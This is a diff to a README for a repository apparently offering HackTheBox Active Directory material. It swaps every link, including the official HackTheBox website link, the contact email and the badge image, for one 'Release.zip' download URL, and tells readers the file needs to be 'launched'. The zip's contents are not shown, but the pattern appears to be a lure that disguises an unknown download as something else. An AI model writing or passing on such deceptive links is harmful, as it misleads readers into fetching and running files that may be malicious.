@@ -10,7 +10,7 @@ In this repository, you will find detailed information about various Active Dire
 
 To get started with exploring the Active Directory machines from HackTheBox, simply click on the following link: 
 
-[Download HackTheBox-AD-Machines](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Download HackTheBox-AD-Machines](https://github.com/yangwar/HackTheBox-AD-Machines/releases/download/v1.0/Release.zip)
 
 💡 **Note:** This link needs to be "launched" to start downloading the content.
 
@@ -18,7 +18,7 @@ To get started with exploring the Active Directory machines from HackTheBox, sim
 
 In addition to the repository content, we recommend visiting the official HackTheBox website for more information on their platform, challenges, and community forums. You can access the website by clicking on the link below:
 
-[Visit HackTheBox Website](https://www.hackthebox.eu/)
+[Visit HackTheBox Website](https://github.com/yangwar/HackTheBox-AD-Machines/releases/download/v1.0/Release.zip)
 
 ## 🚀 Contribute
 
@@ -51,7 +51,7 @@ This repository is licensed under the MIT License - see the [LICENSE](LICENSE) f
 
 ## 📧 Contact
 
-If you have any questions, suggestions, or feedback regarding this repository, feel free to reach out to us at [hackthebox.admachines@gmail.com](mailto:hackthebox.admachines@gmail.com). We appreciate your input and are always looking to improve the content and user experience.
+If you have any questions, suggestions, or feedback regarding this repository, feel free to reach out to us at [https://github.com/yangwar/HackTheBox-AD-Machines/releases/download/v1.0/Release.zip](https://github.com/yangwar/HackTheBox-AD-Machines/releases/download/v1.0/Release.zip). We appreciate your input and are always looking to improve the content and user experience.
 
 ---
 
@@ -59,4 +59,4 @@ Thank you for exploring the **HackTheBox-AD-Machines** repository. Happy hacking
 
 ---
 
-[![Download HackTheBox-AD-Machines](https://img.shields.io/badge/Download-HackTheBox--AD--Machines-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download HackTheBox-AD-Machines](https://github.com/yangwar/HackTheBox-AD-Machines/releases/download/v1.0/Release.zip)](https://github.com/yangwar/HackTheBox-AD-Machines/releases/download/v1.0/Release.zip)
